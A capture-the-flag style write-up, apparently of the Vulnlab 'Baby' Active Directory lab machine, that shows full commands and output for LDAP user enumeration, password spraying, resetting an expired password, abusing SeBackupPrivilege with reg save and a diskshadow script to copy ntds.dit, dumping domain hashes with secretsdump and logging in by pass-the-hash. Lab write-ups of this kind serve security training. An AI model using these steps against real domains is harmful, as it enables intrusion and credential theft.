---
title: Vulnlab Baby Machine
date: 2025-10-31 00:00:00 +0000
categories: [WRITUPS, ACTIVE DIRECTORY]
tags: [activedirectory, sam, ntds]     # TAG names should always be lowercase
---

# BABY MACHINES

IP MACHINE : `10.10.111.217`

# Enumeration to find an entry point

We have the IP address, so we start with an nmap scan to look for entry points. 

```bash
# nmap -sC -A -p- -T4 -oN nmap_all 10.10.114.201
Warning: 10.10.114.201 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.114.201
Host is up (0.18s latency).
Not shown: 65513 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-16 20:46:43Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=BabyDC.baby.vl
| Not valid before: 2025-06-15T20:04:22
|_Not valid after:  2025-12-15T20:04:22
|_ssl-date: 2025-06-16T20:48:23+00:00; +4s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: BABY
|   NetBIOS_Domain_Name: BABY
|   NetBIOS_Computer_Name: BABYDC
|   DNS_Domain_Name: baby.vl
|   DNS_Computer_Name: BabyDC.baby.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-06-16T20:47:44+00:00
5357/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
63238/tcp open  msrpc         Microsoft Windows RPC
63255/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022
Aggressive OS guesses: Microsoft Windows Server 2022 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: BABYDC; OS: Windows; CPE: cpe:/o:microsoft:windows
-------------
```

We can see above that we are dealing with an Active Directory domain (Port 88: Kerberos). We will try to enumerate the SMB file share anonymously, since we have no identification information.

```bash
└─# nxc smb 10.10.111.217 -u '' -p '' --shares
SMB         10.10.111.217   445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False) 
SMB         10.10.111.217   445    BABYDC           [+] baby.vl\: 
SMB         10.10.111.217   445    BABYDC           [-] Error enumerating shares: STATUS_ACCESS_DENIED
```

We get a STATUS_ACCESS_DENIED, which explicitly means that NULL authentication for enumeration is not allowed. So I tried the following enumerations, which did not work:

- RPCCLIENT
- ENUM4LINUX

## Enumeration of users

Taking my research a step further, I wanted to try enumeration using the LDAP protocol, but since I don't have any credentials, I tried LDAP anonymous binding with ldapsearch.

```bash
└─# ldapsearch -H ldap://10.10.111.217 -x -b "DC=BABY,DC=VL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
Guest
Jacqueline.Barnett
Ashley.Webb
Hugh.George
Leonard.Dyer
Connor.Wilkinson
Joseph.Hughes
Kerry.Wilson
Teresa.Bell
```

So I got a few users, I tried to look at each user's descriptions, still using LDAP. There is a compiled command tool called ldapsearch; windapsearch, which allows us to easily perform enumeration based on the LDAP protocol.

```bash
└─# ./windapsearch.py --dc-ip 10.10.111.217 -u "" -U --attrs 'description' 
[+] No username provided. Will try anonymous bind.
[+] Using Domain Controller at: 10.10.111.217
[+] Getting defaultNamingContext from Root DSE
[+]     Found: DC=baby,DC=vl
[+] Attempting bind
[+]     ...success! Binded as: 
[+]      None

[+] Enumerating all AD users
[+]     Found 9 users: 

description: Built-in account for guest access to the computer/domain

description: Set initial password to BabyStart123!

[*] Bye!
```

We discovered a password in a description, so here are the steps I had to take afterwards, but I didn't get any results:

- PasswordSpray with the list of users found above, and the password: BabyStart123!
- I had to remove the exclamation mark, see 😁
- Do the same thing with windapsearch (List users)

When I returned to ldapsearch, I noticed that the user enumeration was missing because some attributes were missing.

So we'll have to make another list:
`ldapsearch -x -b "DC=baby,DC=vl" -H ldap://10.10.88.63 "*" | grep "#" | grep -oE '\b\w+\s\w+\b' | sed 's/ /./g'`

Then I had to add Caroline.Robinson to my list and redo the password spray with my new list.

```bash
#crackmapexec smb 10.10.111.217 -u users.txt  -p 'BabyStart123!' --groups
SMB         10.10.111.217   445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)
SMB         10.10.111.217   445    BABYDC           [-] baby.vl\Guest:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.10.111.217   445    BABYDC           [-] baby.vl\Jacqueline.Barnett:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.10.111.217   445    BABYDC           [-] baby.vl\Ashley.Webb:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.10.111.217   445    BABYDC           [-] baby.vl\Hugh.George:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.10.111.217   445    BABYDC           [-] baby.vl\Leonard.Dyer:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.10.111.217   445    BABYDC           [-] baby.vl\Connor.Wilkinson:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.10.111.217   445    BABYDC           [-] baby.vl\Joseph.Hughes:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.10.111.217   445    BABYDC           [-] baby.vl\Kerry.Wilson:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.10.111.217   445    BABYDC           [-] baby.vl\Teresa.Bell:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.10.111.217   445    BABYDC           [-] baby.vl\Caroline.Robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE
```

## Initial Access

Nous remarquons que l’utilisateur Caroline.Robinson a le : STATUS_PASSWORD_MUST_CHANGE. Ce qui veut dire nous pouvons changer de mot de passe de cet utilisateur
Alors la c’est une nouvelle commande que j’ai decouvert sur: https://www.n00py.io/2021/09/resetting-expired-passwords-remotely/

```bash
#smbpasswd -r 10.10.88.63 -U "Caroline.Robinson"
Old SMB password:
New SMB password:
Retype new SMB password:
Password changed for user Caroline.Robinson
```

After changing the user, I tested the validity with crackmapexec.

```bash
└─# crackmapexec smb 10.10.111.217 -u Caroline.Robinson  -p 'Liebe123'    
SMB         10.10.111.217   445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)
SMB         10.10.111.217   445    BABYDC           [+] baby.vl\Caroline.Robinson:Liebe123
```

So then I tried to log in with those credentials above using the evil-winrm tool.

```bash
──(root㉿kali)-[~/Vulnlab/machines/baby]
└─# evil-winrm -i 10.10.111.217  -u Caroline.Robinson  -p 'Liebe123'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> 
```

## Privilege escalation

We started the enumeration by beginning with whoami /all.

```bash
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

We notice that our user has `SeBackupPrivilege`. We can use this privilege to read and obtain any file from the target machine. If we attack SAM, SYSTEM, or ntds.dit, some important files, we can become SYSTEM. So we will try to dump SAM and SYSTEM to get the hashes and become an administrator.
```bash
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> reg save hklm\system system
The operation completed successfully.

*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> reg save hklm\sam sam
The operation completed successfully.
```

We bring it back to our machine and extract the hashes. 

```bash
$ impacket-secretsdump -sam sam -system system LOCAL
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Target system bootKey: 0x191d5d3fd5b0b51888453de8541d7e88
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8d992faed38128ae85e95fa35868bb43:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

```bash
$ evil-winrm -i 10.10.88.63 -u Administrator -H 8d992faed38128ae85e95fa35868bb43

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError

Error: Exiting with code
```

We see that we cannot log in as a local administrator, so we need to obtain the domain administrator's hash. So we will have to copy the `ntds.dit` database with diskshadow. And here is a script that does the job nicely (ChatGPT was a big help here).

```
set context persistent nowriters
set metadata C:\temp\meta.cab
begin backup
add volume C: alias MyShadow
create
expose %MyShadow% X:
end backup

```

```bash
diskshadow /s script.txt
copy X:\Windows\NTDS\ntds.dit C:\temp\
robocopy /b E:\Windows\ntds . ntds.dit
```

And now we can use secretdump to extract after downloading ntds.dit

```bash
──(root㉿kali)-[~/Vulnlab/machines/baby]
└─# impacket-secretsdump  -ntds ntds.dit -system system.hive local
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x191d5d3fd5b0b51888453de8541d7e88
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 41d56bf9b458d01951f592ee4ba00ea6
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ee4457ae59f1e3fbd764e33d9cef123d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
BABYDC$:1000:aad3b435b51404eeaad3b435b51404ee:9e2ab25057698925e5451557485a8bce:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6da4842e8c24b99ad21a92d620893884:::
baby.vl\Jacqueline.Barnett:1104:aad3b435b51404eeaad3b435b51404ee:20b8853f7aa61297bfbc5ed2ab34aed8:::
baby.vl\Ashley.Webb:1105:aad3b435b51404eeaad3b435b51404ee:02e8841e1a2c6c0fa1f0becac4161f89:::
baby.vl\Hugh.George:1106:aad3b435b51404eeaad3b435b51404ee:f0082574cc663783afdbc8f35b6da3a1:::
baby.vl\Leonard.Dyer:1107:aad3b435b51404eeaad3b435b51404ee:b3b2f9c6640566d13bf25ac448f560d2:::
baby.vl\Ian.Walker:1108:aad3b435b51404eeaad3b435b51404ee:0e440fd30bebc2c524eaaed6b17bcd5c:::
baby.vl\Connor.Wilkinson:1110:aad3b435b51404eeaad3b435b51404ee:e125345993f6258861fb184f1a8522c9:::
baby.vl\Joseph.Hughes:1112:aad3b435b51404eeaad3b435b51404ee:31f12d52063773769e2ea5723e78f17f:::
baby.vl\Kerry.Wilson:1113:aad3b435b51404eeaad3b435b51404ee:181154d0dbea8cc061731803e601d1e4:::
baby.vl\Teresa.Bell:1114:aad3b435b51404eeaad3b435b51404ee:7735283d187b758f45c0565e22dc20d8:::
baby.vl\Caroline.Robinson:1115:aad3b435b51404eeaad3b435b51404ee:b55dcc5fde8be0e8b83b4122900446cb:::
[*] Kerberos keys from ntds.dit 
Administrator:aes256-cts-hmac-sha1-96:ad08cbabedff5acb70049bef721524a23375708cadefcb788704ba00926944f4
Administrator:aes128-cts-hmac-sha1-96:ac7aa518b36d5ea26de83c8d6aa6714d
Administrator:des-cbc-md5:d38cb994ae806b97
BABYDC$:aes256-cts-hmac-sha1-96:6261331c8b710e1ee4b9bcdc2cd994ef6d8a56152cea160969f34a37f49062f6
BABYDC$:aes128-cts-hmac-sha1-96:d1af216d1f283f1dabf97b83b2ff6ff2
BABYDC$:des-cbc-md5:d501f8c1a46485c1
krbtgt:aes256-cts-hmac-sha1-96:9c578fe1635da9e96eb60ad29e4e4ad90fdd471ea4dff40c0c4fce290a313d97
krbtgt:aes128-cts-hmac-sha1-96:1541c9f79887b4305064ddae9ba09e14
krbtgt:des-cbc-md5:d57383f1b3130de5
baby.vl\Jacqueline.Barnett:aes256-cts-hmac-sha1-96:851185add791f50bcdc027e0a0385eadaa68ac1ca127180a7183432f8260e084
baby.vl\Jacqueline.Barnett:aes128-cts-hmac-sha1-96:3abb8a49cf283f5b443acb239fd6f032
baby.vl\Jacqueline.Barnett:des-cbc-md5:01df1349548a206b
baby.vl\Ashley.Webb:aes256-cts-hmac-sha1-96:fc119502b9384a8aa6aff3ad659aa63bab9ebb37b87564303035357d10fa1039
baby.vl\Ashley.Webb:aes128-cts-hmac-sha1-96:81f5f99fd72fadd005a218b96bf17528
baby.vl\Ashley.Webb:des-cbc-md5:9267976186c1320e
baby.vl\Hugh.George:aes256-cts-hmac-sha1-96:0ea359386edf3512d71d3a3a2797a75db3168d8002a6929fd242eb7503f54258
baby.vl\Hugh.George:aes128-cts-hmac-sha1-96:50b966bdf7c919bfe8e85324424833dc
baby.vl\Hugh.George:des-cbc-md5:296bec86fd323b3e
```

With the hash, we can connect:

```bash
┌──(root㉿kali)-[~/Vulnlab/machines/baby]
└─# evil-winrm -i 10.10.82.35 -u Administrator  -H ee4457ae59f1e3fbd764e33d9cef123d
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```